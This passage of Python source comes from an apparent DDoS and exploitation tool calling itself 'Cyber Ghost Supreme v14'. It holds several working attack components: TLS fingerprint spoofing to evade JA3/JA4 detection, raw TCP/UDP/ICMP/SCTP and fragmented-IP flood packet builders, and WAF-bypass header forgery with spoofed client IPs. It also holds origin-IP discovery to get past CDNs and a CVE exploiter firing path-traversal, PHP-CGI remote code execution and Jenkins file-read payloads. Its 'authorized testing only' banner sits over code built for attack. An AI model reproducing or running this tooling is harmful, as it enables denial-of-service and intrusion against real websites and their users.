        candidate_origin.sort(key=lambda x: 0 if ("bruteforce" in x[1] or "spf" in x[1]) else 1)
        return {"domain": self.domain, "subdomains": sorted(self.subdomains)[:500],
                "domain_ips": sorted(domain_ips), "candidate_origin_ips": candidate_origin,
                "total_ips": len(self.results)}
    @staticmethod
    async def discover(domain, use_proxy=False):
        disc = OriginIPDiscovery(domain); disc._load_keys()
        return await disc.run(use_proxy=use_proxy)

# ============================================================================
#  TLS FINGERPRINT
# ============================================================================
class TLSFingerprint:
    CIPHER_SUITES = [0x1301, 0x1302, 0x1303, 0x1304, 0x1305,
                     0xc02b, 0xc02f, 0xc02c, 0xc030, 0xcca9, 0xcca8,
                     0xc013, 0xc014, 0x009c, 0x009d, 0x002f, 0x0035,
                     0x000a, 0xc009, 0xc00a, 0xc023, 0xc024, 0xc027, 0xc028,
                     0xc02d, 0xc02e, 0xc031, 0xc032]
    EXT_TYPES = [0x0000, 0x0005, 0x000a, 0x000b, 0x000d, 0x0010,
                 0x0012, 0x0017, 0x001b, 0x001c, 0x001d, 0x0023,
                 0x002b, 0x002d, 0x002f, 0x0032, 0x0033, 0x0035,
                 0x5500, 0x5501, 0x5502, 0xfe0d]
    GROUPS = [29, 23, 24, 25, 256, 257, 258, 259, 260, 30, 0x11ec, 0x11eb]
    SIG_ALGS = [0x0403, 0x0503, 0x0603, 0x0804, 0x0805, 0x0806,
                0x0401, 0x0501, 0x0601, 0x0201, 0x0203, 0x0807,
                0x0808, 0x0809, 0x080a, 0x080b, 0x080c, 0x080d]
    @classmethod
    def random_client_hello(cls, sni, alpn=None, ech=False):
        alpn = alpn or random.choice([["h2", "http/1.1"], ["h3"], ["http/1.1"]])
        ciphers = random.sample(cls.CIPHER_SUITES, k=random.randint(8, len(cls.CIPHER_SUITES)))
        session_id = os.urandom(random.choice([0, 16, 32]))
        random_bytes = os.urandom(32)
        exts = []
        sni_b = sni.encode()
        sni_ext = struct.pack("!H", len(sni_b) + 3) + b"\x00" + struct.pack("!H", len(sni_b)) + sni_b
        exts.append((0x0000, sni_ext))
        groups = random.sample(cls.GROUPS, k=random.randint(3, len(cls.GROUPS)))
        grp = struct.pack("!H", len(groups) * 2) + b"".join(struct.pack("!H", g) for g in groups)
        exts.append((0x000a, grp))
        sigs = random.sample(cls.SIG_ALGS, k=random.randint(4, len(cls.SIG_ALGS)))
        sig = struct.pack("!H", len(sigs) * 2) + b"".join(struct.pack("!H", s) for s in sigs)
        exts.append((0x000d, sig))
        alpn_payload = b"".join(bytes([len(p)]) + p.encode() for p in alpn)
        exts.append((0x0010, struct.pack("!H", len(alpn_payload)) + alpn_payload))
        exts.append((0x002b, b"\x02\x03\x04"))
        exts.append((0x000b, b"\x01\x00"))
        exts.append((0x0023, b""))
        if random.random() > 0.5: exts.append((0x0029, os.urandom(20)))
        if random.random() > 0.3:
            ks = struct.pack("!H", 2) + struct.pack("!H", 29) + struct.pack("!H", 32) + os.urandom(32)
            exts.append((0x0033, ks))
        if ech:
            exts.append((0xfe0d, os.urandom(random.randint(32, 128))))
        if random.random() > 0.5:
            used = [x[0] for x in exts]
            avail = [e for e in cls.EXT_TYPES if e not in used]
            if avail: exts.append((random.choice(avail), os.urandom(random.randint(0, 16))))
        random.shuffle(exts)
        exts_bytes = b"".join(struct.pack("!HH", t, len(d)) + d for t, d in exts)
        ch_body = (b"\x03\x03" + random_bytes + bytes([len(session_id)]) + session_id +
                   struct.pack("!H", len(ciphers) * 2) +
                   b"".join(struct.pack("!H", c) for c in ciphers) + b"\x01\x00" +
                   struct.pack("!H", len(exts_bytes)) + exts_bytes)
        hs = b"\x01" + struct.pack("!I", len(ch_body))[1:] + ch_body
        record = b"\x16\x03\x01" + struct.pack("!H", len(hs)) + hs
        ja3_str = ",".join(["771",
                            "-".join(str(c) for c in ciphers),
                            "-".join(str(t) for t, _ in exts),
                            "-".join(str(g) for g in groups),
                            "0"])
        ja3_hash = hashlib.md5(ja3_str.encode()).hexdigest()
        tlsver = "13" if 0x2b in [t for t, _ in exts] else "12"
        alpn_str = (alpn[0][:2] if alpn else "00").ljust(2, "0")
        ja4_a = f"q{tlsver}d{len(ciphers):02x}{len(exts):02x}{alpn_str}"
        cipher_hash = hashlib.sha256(",".join(sorted(str(c) for c in ciphers)).encode()).hexdigest()[:12]
        ext_hash = hashlib.sha256(",".join([str(t) for t, _ in exts] + [str(s) for s in sigs]).encode()).hexdigest()[:12]
        ja4 = f"{ja4_a}_{cipher_hash}_{ext_hash}"
        return record, ja3_hash, ja4

# ============================================================================
#  PACKET BUILDERS
# ============================================================================
def _checksum(data):
    if len(data) % 2: data += b'\x00'
    total = 0
    for i in range(0, len(data), 2): total += (data[i] << 8) + data[i + 1]
    total = (total >> 16) + (total & 0xffff); total += total >> 16
    return (~total) & 0xffff

def random_tcp_options(sack=False, fastopen=False):
    opts = []
    mss = random.choice([536, 1200, 1400, 1440, 1452, 1460, 8960, 9120])
    opts.append(struct.pack("!BBH", 2, 4, mss))
    if sack and random.random() > 0.3:
        opts.append(b"\x04\x02")
    if fastopen:
        cookie = os.urandom(4 + random.randint(0, 12))
        opts.append(b"\x22" + bytes([len(cookie) + 2]) + cookie)
    if random.random() > 0.2:
        opts.append(b"\x08\x0a" + struct.pack("!II", secrets.randbits(32), secrets.randbits(32)))
    opts.append(b"\x01")
    opts.append(struct.pack("!BBB", 3, 3, random.randint(0, 14)))
    raw = b"".join(opts)
    pad = (4 - len(raw) % 4) % 4
    return raw + b"\x01" * pad

def ip_header(src, dst, proto, plen, ttl=64, frag_off=0):
    tl = 20 + plen
    h = struct.pack('!BBHHHBBH4s4s', 69, 0, tl, _rand().next() & 0xffff, frag_off, ttl,
                    proto, 0, socket.inet_aton(src), socket.inet_aton(dst))
    return struct.pack('!BBHHHBBH4s4s', 69, 0, tl, _rand().next() & 0xffff, frag_off, ttl,
                       proto, _checksum(h), socket.inet_aton(src), socket.inet_aton(dst))

def tcp_packet(src, dst, sp, dp, seq, ack, flags, payload=b'', ttl=64,
               sack=False, fastopen=False):
    opts = random_tcp_options(sack=sack, fastopen=fastopen)
    doff = (20 + len(opts)) // 4
    h = struct.pack('!HHLLBBHHH', sp, dp, seq, ack, (doff << 4), flags, 65535, 0, 0) + opts
    pseudo = struct.pack('!4s4sBBH', socket.inet_aton(src), socket.inet_aton(dst),
                         0, socket.IPPROTO_TCP, len(h) + len(payload))
    ck = _checksum(pseudo + h + payload)
    h = (struct.pack('!HHLLBBH', sp, dp, seq, ack, (doff << 4), flags, 65535) +
         struct.pack('!H', ck) + struct.pack('!H', 0) + opts)
    return ip_header(src, dst, socket.IPPROTO_TCP, len(h) + len(payload), ttl) + h + payload

def udp_packet(src, dst, sp, dp, payload, ttl=64):
    ulen = 8 + len(payload)
    h = struct.pack('!HHHH', sp, dp, ulen, 0)
    pseudo = struct.pack('!4s4sBBH', socket.inet_aton(src), socket.inet_aton(dst), 0,
                         socket.IPPROTO_UDP, ulen)
    ck = _checksum(pseudo + h + payload) or 0xffff
    return (ip_header(src, dst, socket.IPPROTO_UDP, ulen, ttl) +
            struct.pack('!HHHH', sp, dp, ulen, ck) + payload)

def icmp_packet(src, dst, payload, typ=8, code=0):
    iid = _rand().next() & 0xffff; iseq = _rand().next() & 0xffff
    h = struct.pack('!BBHHH', typ, code, 0, iid, iseq)
    ck = _checksum(h + payload)
    return (ip_header(src, dst, socket.IPPROTO_ICMP, len(h) + len(payload)) +
            struct.pack('!BBHHH', typ, code, ck, iid, iseq) + payload)

def sctp_init_packet(src, dst, sp, dp, ttl=64):
    # SCTP common header: sport(2), dport(2), vtag(4), checksum(4)
    # INIT chunk: type=1, flags=0, length=20+params
    vtag = secrets.randbits(32)
    iseq = secrets.randbits(32)
    init_params = struct.pack("!HH", 0x0007, 4 + 4) + struct.pack("!I", random.randint(1000, 65535))  # max streams in
    init_params += struct.pack("!HH", 0x0008, 4 + 4) + struct.pack("!I", random.randint(1000, 65535))  # max streams out
    chunk_body = struct.pack("!II", iseq, 0) + struct.pack("!II", random.randint(1000, 65535),
                                                            random.randint(1000, 65535))
    chunk_body += init_params
    chunk_len = 4 + 16 + len(init_params)
    # padding to 4-byte boundary
    pad = (4 - (chunk_len % 4)) % 4
    chunk = struct.pack("!BBH", 1, 0, chunk_len) + chunk_body + b"\x00" * pad
    sctp_hdr = struct.pack("!HHII", sp, dp, vtag, 0)
    payload = sctp_hdr + chunk
    # CRC32c is left as zero; many stacks drop early without validation during flood
    return ip_header(src, dst, 132, len(payload), ttl) + payload

def fragmented_ip(src, dst, proto, payload, frag_size=8):
    pkts = []; ident = _rand().next() & 0xffff; off = 0; total = len(payload)
    while off < total:
        chunk = payload[off:off + frag_size]; start = off; off += len(chunk)
        mf = 1 if off < total else 0; fo = (start // 8) << 3 | mf
        tl = 20 + len(chunk)
        h = struct.pack('!BBHHHBBH4s4s', 69, 0, tl, ident, fo, 64, proto, 0,
                        socket.inet_aton(src), socket.inet_aton(dst))
        pkts.append(struct.pack('!BBHHHBBH4s4s', 69, 0, tl, ident, fo, 64, proto,
                                _checksum(h), socket.inet_aton(src),
                                socket.inet_aton(dst)) + chunk)
    return pkts

# ============================================================================
#  ATTACK CONFIG
# ============================================================================
class AttackConfig(BaseModel):
    target: str
    port: int = 80
    method: str = "INFINITY_MIX"
    duration: int = DEFAULT_DURATION
    bandwidth_limit: int = 0
    use_proxy: bool = True
    proxy_policy: str = "weighted"
    origin_ip: str = ""
    lang: str = "en"
    concurrency: int = 2000
    processes: int = 0
    rate_limit_pps: int = 0
    spoof_source: bool = False
    ipv6: bool = False
    waf_bypass: bool = True
    auto_origin: bool = False
    rotate_identity: bool = True
    ja3_spoof: bool = True
    ja4_spoof: bool = True
    adaptive: bool = True

# ============================================================================
#  CVE EXPLOITER
# ============================================================================
class CVEExploiter:
    CVES = {
        "CVE-2021-41773": {"payload": "/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd", "method": "GET"},
        "CVE-2024-4577": {"payload": "/?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input",
                          "method": "POST", "body": "<?php system('whoami'); ?>"},
        "CVE-2024-23897": {"payload": "/cli?remoting=false", "method": "POST",
                           "headers": {"Session": "", "Side": "download"}, "body": "@{/etc/passwd}"},
        "CVE-2025-24813": {"payload": "/test/session", "method": "PUT",
                           "body": b"test", "headers": {"Content-Range": "bytes 0-3/4"}},
        "CVE-2025-29927": {"payload": "/", "method": "GET",
                           "headers": {"x-middleware-subrequest": "middleware:middleware:middleware:middleware:middleware"}},
    }
    def __init__(self, target_url, engine, original_host=None, origin_ip=None, origin_port=None):
        self.target_url = target_url
        self.engine = engine
        self.original_host = original_host
        self.origin_ip = origin_ip
        self.origin_port = origin_port or 443
        self.results = []; self.attempts = 0
        self.last_error = ""; self.error_count = 0
        self.lock = threading.Lock()
    def _stop(self):
        return self.engine._stop
    def _run_sync(self):
        for cve_id, data in self.CVES.items():
            if self._stop(): break
            with self.lock: self.attempts += 1
            try:
                p = urlparse(self.target_url)
                base = f"{p.scheme}://{p.hostname}" + (f":{p.port}" if p.port else "")
                url = base + data["payload"]
                headers = {"User-Agent": random.choice(USER_AGENTS)}
                if "headers" in data: headers.update(data["headers"])
                if self.original_host: headers["Host"] = self.original_host
                method = data.get("method", "GET"); body = data.get("body")
                r = None
                if HAS_CURL_CFFI:
                    try:
                        session = curl_requests.Session(impersonate="chrome120")
                        if self.origin_ip and self.original_host:
                            try:
                                session.curl.setopt(CurlOpt.RESOLVE,
                                    [f"{self.original_host}:{self.origin_port}:{self.origin_ip}"])
                                session.curl.setopt(CurlOpt.SSL_VERIFYHOST, 0)
                                session.curl.setopt(CurlOpt.SSL_VERIFYPEER, 0)
                            except Exception: pass
                        r = session.request(method, url, headers=headers, data=body,
                                            timeout=10, verify=False)
                    except Exception: r = None
                if r is not None:
                    with self.lock: self.results.append({"cve": cve_id, "status": r.status_code})
            except Exception as e:
                with self.lock:
                    self.last_error = type(e).__name__[:40]; self.error_count += 1
    async def attack(self):
        loop = asyncio.get_running_loop()
        try: await loop.run_in_executor(None, self._run_sync)
        except Exception: pass

# ============================================================================
#  COLOR HELPERS
# ============================================================================
class C:
    RESET = "\033[0m"; BOLD = "\033[1m"; DIM = "\033[2m"
    RED = "\033[91m"; GREEN = "\033[92m"; YELLOW = "\033[93m"
    BLUE = "\033[94m"; MAGENTA = "\033[95m"; CYAN = "\033[96m"; WHITE = "\033[97m"

def clear_screen(): os.system("cls" if IS_WINDOWS else "clear")
def term_width():
    try: return min(os.get_terminal_size().columns, 160)
    except Exception: return 140
def safe_input(prompt, default=""):
    try:
        v = input(prompt).strip(); return v if v else default
    except (EOFError, KeyboardInterrupt): return default
def get_local_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80)); ip = s.getsockname()[0]; s.close(); return ip
    except Exception:
        try: return socket.gethostbyname(socket.gethostname())
        except Exception: return "127.0.0.1"

BANNER = r"""
   ██████╗██╗   ██╗██████╗ ███████╗██████╗      ██████╗ ██╗  ██╗ ██████╗ ███████╗████████╗
  ██╔════╝╚██╗ ██╔╝██╔══██╗██╔════╝██╔══██╗    ██╔════╝ ██║  ██║██╔═══██╗██╔════╝╚══██╔══╝
  ██║      ╚████╔╝ ██████╔╝█████╗  ██████╔╝    ██║  ███╗███████║██║   ██║███████╗   ██║
  ██║       ╚██╔╝  ██╔══██╗██╔══╝  ██╔══██╗    ██║   ██║██╔══██║██║   ██║╚════██║   ██║
  ╚██████╗   ██║   ██████╔╝███████╗██║  ██║    ╚██████╔╝██║  ██║╚██████╔╝███████║   ██║
   ╚═════╝   ╚═╝   ╚═════╝ ╚══════╝╚═╝  ╚═╝     ╚═════╝ ╚═╝  ╚═╝ ╚═════╝ ╚══════╝   ╚═╝
                          S U P R E M E   v14
"""

def print_banner():
    clear_screen(); w = term_width()
    for line in BANNER.strip("\n").split("\n"):
        print(f"{C.CYAN}{C.BOLD}{' ' * max(0, (w - len(line)) // 2)}{line}{C.RESET}")
    print()
    tag = f"⚡ OMNIPOTENT SUPREME v{VERSION} — Build {BUILD} ⚡"
    print(f"{C.YELLOW}{C.BOLD}{' ' * max(0, (w - len(tag)) // 2)}{tag}{C.RESET}")
    print()
    info = f"🧠 Creator: {CREATOR}   |   📱 {TELEGRAM}   |   📢 {CHANNEL}"
    print(f"{C.MAGENTA}{C.BOLD}{' ' * max(0, (w - len(info)) // 2)}{info}{C.RESET}")
    print()
    feats = []
    def feat(ok, name):
        return f"{C.GREEN}{name}✓{C.RESET}" if ok else f"{C.DIM}{name}✗{C.RESET}"
    for ok, name in [(HAS_UVLOOP, "uvloop"), (HAS_H2, "h2"), (HAS_AIOQUIC, "aioquic"),
                     (HAS_AIO_SOCKS, "aiohttp-socks"), (HAS_PYSOCKS, "pysocks"),
                     (HAS_SCAPY, "scapy"), (HAS_DNSPY, "dnspython"),
                     (HAS_CURL_CFFI, "curl_cffi"), (HAS_BROTLI, "brotli"),
                     (HAS_BROWSERFORGE, "browserforge"), (HAS_MMH3, "mmh3"),
                     (HAS_LIBC and IS_LINUX, "sendmmsg")]:
        feats.append(feat(ok, name))
    print(f"{C.DIM}{' ' * max(0, (w - len('  '.join(feats)) - 60) // 2)}{'  '.join(feats)}{C.RESET}")
    print()
    print(f"{C.RED}{C.BOLD}{'═' * w}{C.RESET}")
    for msg in ["⚠️  WARNING / هشدار", "FOR AUTHORIZED SECURITY TESTING ONLY",
                "Unauthorized use is a CRIMINAL OFFENSE",
                "Use ONLY on your own servers"]:
        print(f"{C.RED}{C.BOLD}{' ' * max(0, (w - len(msg)) // 2)}{msg}{C.RESET}")
    print(f"{C.RED}{C.BOLD}{'═' * w}{C.RESET}\n")

def print_mode_menu():
    w = term_width()
    print(f"{C.GREEN}{C.BOLD}╔{'═' * (w - 2)}╗{C.RESET}")
    title = "SELECT MODE"
    pad_left = (w - 2 - len(title)) // 2
    pad_right = w - 2 - pad_left - len(title)
    print(f"{C.GREEN}{C.BOLD}║{' ' * pad_left}{title}{' ' * pad_right}║{C.RESET}")
    print(f"{C.GREEN}{C.BOLD}╠{'═' * (w - 2)}╣{C.RESET}")
    for o in ["  [1]  🖥️   Terminal Attack Mode   (CLI)",
              "  [2]  🌐   Web Panel Mode         (Local + LAN)",
              "  [3]  🔎   Origin IP Discovery     (25+ sources)",
              "  [4]  🛡️   Obfuscation Tools       (Windows only)"]:
        print(f"{C.GREEN}║{C.RESET}{C.CYAN}{o}{' ' * (w - 2 - len(o))}{C.GREEN}║{C.RESET}")
    print(f"{C.GREEN}{C.BOLD}╚{'═' * (w - 2)}╝{C.RESET}\n")
    while True:
        v = safe_input(f"{C.YELLOW}{C.BOLD}>> Enter 1, 2, 3 or 4: {C.RESET}")
        if v in ("1", "2", "3", "4"): return v

# ============================================================================
#  HEADER FACTORY
# ============================================================================
class HeaderFactory:
    @staticmethod
    def build(target_host, use_waf_bypass=True, spoof=None):
        h = {
            "User-Agent": random.choice(USER_AGENTS),
            "Accept": random.choice(["*/*",
                "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                "application/json, text/plain, */*",
                "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8"]),
            "Accept-Language": random.choice(ACCEPT_LANGS),
            "Accept-Encoding": random.choice(ENCODINGS),
            "Connection": random.choice(["keep-alive", "close"]),
            "Cache-Control": random.choice(["no-cache", "no-store", "max-age=0"]),
            "Pragma": random.choice(["no-cache", ""]),
            "Upgrade-Insecure-Requests": "1",
            "Sec-Fetch-Dest": random.choice(["document", "empty"]),
            "Sec-Fetch-Mode": random.choice(["navigate", "cors", "no-cors"]),
            "Sec-Fetch-Site": random.choice(["none", "same-origin", "cross-site"]),
            "Sec-CH-UA": random.choice(['"Chromium";v="132", "Not A(Brand";v="24"',
                '"Google Chrome";v="132", "Chromium";v="132"',
                '"Firefox";v="135", "Not A(Brand";v="24"']),
            "Sec-CH-UA-Mobile": random.choice(["?0", "?1"]),
            "Sec-CH-UA-Platform": random.choice(['"Windows"', '"macOS"', '"Linux"', '"Android"', '"iOS"']),
            "Referer": random.choice(REFERERS),
            "Host": target_host,
        }
        if use_waf_bypass and waf_detector.detected:
            h.update(waf_detector.bypass_headers(spoof))
        elif use_waf_bypass:
            spoof = spoof or HeaderFactory._rand_ip()
            for k in ["X-Forwarded-For", "X-Real-IP", "X-Client-IP",
                      "X-Remote-IP", "X-Originating-IP", "CF-Connecting-IP", "True-Client-IP"]:
                if random.random() > 0.5: h[k] = spoof
        return {k: v for k, v in h.items() if v != ""}
    @staticmethod
    def _rand_ip():
        for _ in range(20):
            ip = ipaddress.ip_address(secrets.randbits(32))
            if not (ip.is_private or ip.is_loopback or ip.is_multicast or
                    ip.is_reserved or ip.is_link_local or ip.is_unspecified):
                return str(ip)
        return "1.2.3.4"

# ============================================================================
#  NETWORK MONITORS
# ============================================================================
class NetworkMonitor:
    def __init__(self, interval=5.0):
        self.interval = interval; self.running = False; self.thread = None
        self.lock = threading.Lock()
        self._prev = None; self._prev_time = None
        self._baseline_bytes_sent = 0; self._baseline_pkts_sent = 0
        self.stats = {"mbps_out": 0.0, "pps_out": 0.0, "err_out": 0}
    def start(self):
        if not HAS_PSUTIL: return False
        try:
            cur = psutil.net_io_counters()
            self._prev = cur; self._prev_time = time.monotonic()
            self._baseline_bytes_sent = cur.bytes_sent
            self._baseline_pkts_sent = cur.packets_sent
        except Exception: return False
        self.running = True
        self.thread = threading.Thread(target=self._loop, daemon=True, name="netmon")
        self.thread.start(); return True
    def _loop(self):
        while self.running:
            time.sleep(self.interval)
            try:
                cur = psutil.net_io_counters()
                now = time.monotonic()
                dt = max(0.001, now - self._prev_time)
                with self.lock:
                    self.stats["mbps_out"] = (cur.bytes_sent - self._prev.bytes_sent) * 8 / dt / 1e6
                    self.stats["pps_out"] = (cur.packets_sent - self._prev.packets_sent) / dt
                    self.stats["err_out"] = cur.errout
                self._prev = cur; self._prev_time = now
            except Exception: pass
    def total_bytes_sent(self):
        try:
            with self.lock:
                return max(0, psutil.net_io_counters().bytes_sent - self._baseline_bytes_sent)
        except Exception: return 0
    def snapshot(self):
        with self.lock: return dict(self.stats)
    def stop(self): self.running = False

class NetworkHealthMonitor:
    def __init__(self, interval=3.0, min_upload_mbps=0.1, max_upload_mbps=10000.0):
        self.interval = interval
        self.min_upload_mbps = min_upload_mbps
        self.max_upload_mbps = max_upload_mbps
        self.running = False; self.thread = None
        self.lock = threading.Lock()
        self._prev = None; self._prev_time = None
        self._started = False
        self.stats = {"health": "OK", "paused": False, "mbps_out": 0.0}
        self._consecutive_low = 0; self._consecutive_high = 0
    def start(self):
        if not HAS_PSUTIL: return False
        try:
            self._prev = psutil.net_io_counters()
            self._prev_time = time.monotonic()
        except Exception: return False
        self.running = True
        self.thread = threading.Thread(target=self._loop, daemon=True, name="nethealth")
        self.thread.start(); return True
    def activate(self): self._started = True
    def _loop(self):
        while self.running:
            time.sleep(self.interval)
            try:
                cur = psutil.net_io_counters()
                now = time.monotonic()
                dt = max(0.001, now - self._prev_time)
                mbps_out = (cur.bytes_sent - self._prev.bytes_sent) * 8 / dt / 1e6
                with self.lock:
                    self.stats["mbps_out"] = mbps_out
                    if not self._started:
                        self.stats["health"] = "OK"; self.stats["paused"] = False
                    else:
                        if mbps_out < self.min_upload_mbps:
                            self._consecutive_low += 1
                            if self._consecutive_low >= 5:
                                self.stats["health"] = "DEGRADED"; self.stats["paused"] = True
                        elif mbps_out > self.max_upload_mbps:
                            self._consecutive_high += 1
                            if self._consecutive_high >= 3:
                                self.stats["health"] = "SATURATED"; self.stats["paused"] = True
                        else:
                            self._consecutive_low = 0; self._consecutive_high = 0
                            self.stats["health"] = "OK"; self.stats["paused"] = False
                self._prev = cur; self._prev_time = now
            except Exception: pass
    def is_paused(self):
        with self.lock: return self.stats["paused"]
    def snapshot(self):
        with self.lock: return dict(self.stats)
    def stop(self): self.running = False

class AdaptiveRateLimiter:
    def __init__(self, base_rate=5000, burst=20000, min_rate=200, max_rate=500000):
        self.base_rate = base_rate; self.current_rate = base_rate
        self.min_rate = min_rate; self.max_rate = max_rate
        self.burst = burst; self.tokens = burst
        self.last_refill = time.monotonic()
        self.lock = threading.Lock()
        self.error_window = []
        self.backoff_factor = 0.95; self.recovery_factor = 1.15
        self.last_backoff = 0; self.backoff_count = 0
        self._ssl_errors = 0
    def record_error(self, error_type=""):
        if "SSL" in error_type:
            self._ssl_errors += 1; return
        now = time.monotonic()
        with self.lock:
            self.error_window.append(now)
            self.error_window = [t for t in self.error_window if now - t < 5.0]
            if len(self.error_window) > 300:
                if now - self.last_backoff > 2.0:
                    self.current_rate = max(self.min_rate, int(self.current_rate * self.backoff_factor))
                    self.last_backoff = now; self.backoff_count += 1
    def record_success(self):
        now = time.monotonic()
        with self.lock:
            if self.current_rate < self.base_rate and now - self.last_backoff > 3.0:
                self.current_rate = min(self.base_rate, int(self.current_rate * self.recovery_factor))
    def force_reduce(self, factor=0.5):
        with self.lock:
            self.current_rate = max(self.min_rate, int(self.current_rate * factor))
            self.backoff_count += 1
    def consume(self, tokens=1):
        with self.lock:
            now = time.monotonic()
            elapsed = now - self.last_refill
            self.tokens = min(self.burst, self.tokens + elapsed * self.current_rate)
            self.last_refill = now
            if self.tokens >= tokens:
                self.tokens -= tokens; return True
            return False
    async def acquire(self, tokens=1):
        wait = 0.0001
        while not self.consume(tokens):
            await asyncio.sleep(wait)
            wait = min(wait * 1.5, 0.01)
    def get_rate(self):
        with self.lock: return self.current_rate

# ============================================================================
#  CYBER GHOST ENGINE
# ============================================================================
class CyberGhost:
    def __init__(self):
        self.running = False; self._stop = False
        self._lifecycle_lock = threading.Lock()
        self.target_url = ""; self.target_ip = ""; self.target_host = ""
        self.target_port = 80; self.method = "INFINITY_MIX"
        self.duration = DEFAULT_DURATION; self.use_proxy = True
        self.origin_ip = ""; self.concurrency = 2000
        self.rate_limit_pps = 0; self.spoof_source = False
        self.proxy_policy = ProxyManager.ROT_WEIGHTED
        self.waf_bypass = True; self.ja3_spoof = True; self.ja4_spoof = True
        self.adaptive = True

        self.stats_lf = LockFreeStats()
        self.method_stats = defaultdict(int)
        self.method_lock = threading.Lock()
        self.start_mono = 0

        self.raw_tcp = None; self.raw_udp = None
        self.raw_icmp = None; self.raw_ip = None; self.raw_sctp = None

        self.loop = None; self.loop_thread = None
        self._loop_ready = threading.Event()
        self._loop_stopped = threading.Event()

        self._executor_adaptive = AdaptiveExecutor(
            base_threads=max(16, mp.cpu_count() * 8), base_concurrency=2000)
        self._waf_confirmed = None
        self.adaptive_controller = None
        self.net_monitor = None; self.net_health = None
        self.adaptive_limiter = None
        self._rl_lock = threading.Lock()
        self._rl_tokens = 0.0; self._rl_last = time.monotonic()
        self.ja3_seen = set(); self.ja4_seen = set()
        self._hc_stop = threading.Event()
        self._health_status = {"alive": False, "status": 0, "error": "not_checked"}
        self._auto_threads = []
        self._sni_spoofer = SNISpoofer()

    def _start_loop(self):
        if self.loop_thread and self.loop_thread.is_alive(): return
        self._loop_ready.clear(); self._loop_stopped.clear()
        self.loop_thread = threading.Thread(target=self._run_loop, name="ghost-loop", daemon=True)
        self.loop_thread.start()
        self._loop_ready.wait(timeout=5.0)

    def _run_loop(self):
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop); self.loop = loop
        self._loop_ready.set()
        try: loop.run_forever()
        finally:
            try:
                pending = asyncio.all_tasks(loop)
                for t in pending: t.cancel()
                if pending:
                    loop.run_until_complete(asyncio.gather(*pending, return_exceptions=True))
                loop.run_until_complete(loop.shutdown_asyncgens())
            except Exception: pass
            loop.close(); self._loop_stopped.set()

    def _stop_loop(self):
        if self.loop and not self.loop.is_closed():
            with suppress(Exception): self.loop.call_soon_threadsafe(self.loop.stop)
        if self.loop_thread: self.loop_thread.join(timeout=5.0)
        self._loop_stopped.wait(timeout=2.0)
        self.loop = None; self.loop_thread = None

    def _submit(self, coro):
        if self.loop and not self.loop.is_closed():
            return asyncio.run_coroutine_threadsafe(coro, self.loop)
        return None

    def _init_raw(self):
        for name, proto, attr, hdrincl in [
            ("TCP", socket.IPPROTO_TCP, "raw_tcp", True),
            ("UDP", socket.IPPROTO_UDP, "raw_udp", True),
            ("ICMP", socket.IPPROTO_ICMP, "raw_icmp", False),
            ("RAW", socket.IPPROTO_RAW, "raw_ip", True),
            ("SCTP", 132, "raw_sctp", True)]:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_RAW, proto)
                if hdrincl: s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
                s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                s.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 64 * 1024 * 1024)
                setattr(self, attr, s)
            except PermissionError:
                logger.warning(f"{name} raw requires root/admin")
                setattr(self, attr, None)
            except Exception as e:
                logger.warning(f"{name} raw: {e}")
                setattr(self, attr, None)

    def _close_raw(self):
        for a in ("raw_tcp", "raw_udp", "raw_icmp", "raw_ip", "raw_sctp"):
            s = getattr(self, a, None)
            if s:
                with suppress(Exception): s.close()
                setattr(self, a, None)

    async def _detect_waf(self):
        if not self.waf_bypass: return
        try:
            conn = aiohttp.TCPConnector(ssl=False)
            headers = HeaderFactory.build(self.target_host, use_waf_bypass=False)
            timeout = aiohttp.ClientTimeout(total=8)
            async with aiohttp.ClientSession(connector=conn, timeout=timeout) as sess:
                async with sess.get(self.target_url, headers=headers, allow_redirects=False) as r:
                    body = await r.read()
                    cookies = {c.key: c.value for c in r.cookies.values()}
                    waf_detector.detect_from_response(dict(r.headers), body, cookies)
                    if waf_detector.detected: self._waf_confirmed = waf_detector.detected
        except Exception: pass

    def _start_health_checker(self):
        self._hc_stop.clear()
        def _loop():
            time.sleep(2)
            while not self._hc_stop.is_set():
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(5); s.connect((self.target_ip, self.target_port)); s.close()
                    self._health_status = {"alive": True, "status": 200, "error": ""}
                except Exception as e:
                    self._health_status = {"alive": False, "status": 0,
                                           "error": type(e).__name__[:30]}
                self._hc_stop.wait(10)
        th = threading.Thread(target=_loop, daemon=True, name="health")
        th.start(); self._auto_threads.append(th)

    def _proxy_tcp_connect(self, host, port, timeout=3.0):
        entry = proxy_manager.get(policy=self.proxy_policy) if self.use_proxy else None
        if not entry:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(timeout); s.connect((host, port)); return s
        t0 = time.monotonic()
        try:
            if entry.scheme in (ProxyType.SOCKS4, ProxyType.SOCKS5) and HAS_PYSOCKS:
                s = socks.socksocket()
                st = socks.SOCKS4 if entry.scheme == ProxyType.SOCKS4 else socks.SOCKS5
                s.set_proxy(st, entry.host, entry.port, username=entry.user, password=entry.password)
                s.settimeout(timeout); s.connect((host, port))
                proxy_manager.report(entry, True, (time.monotonic() - t0) * 1000); return s
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(timeout); s.connect((entry.host, entry.port))
            req = f"CONNECT {host}:{port} HTTP/1.1\r\nHost: {host}:{port}\r\n".encode()
            if entry.user:
                cred = base64.b64encode(f"{entry.user}:{entry.password or ''}".encode()).decode()
                req += f"Proxy-Authorization: Basic {cred}\r\n".encode()
            req += f"User-Agent: {random.choice(USER_AGENTS)}\r\n\r\n".encode()
            s.send(req); resp = s.recv(1024)
            if b"200" not in resp.split(b"\r\n", 1)[0]:
                s.close(); proxy_manager.report(entry, False)
                raise ConnectionError("Proxy CONNECT failed")
            proxy_manager.report(entry, True, (time.monotonic() - t0) * 1000); return s
        except Exception:
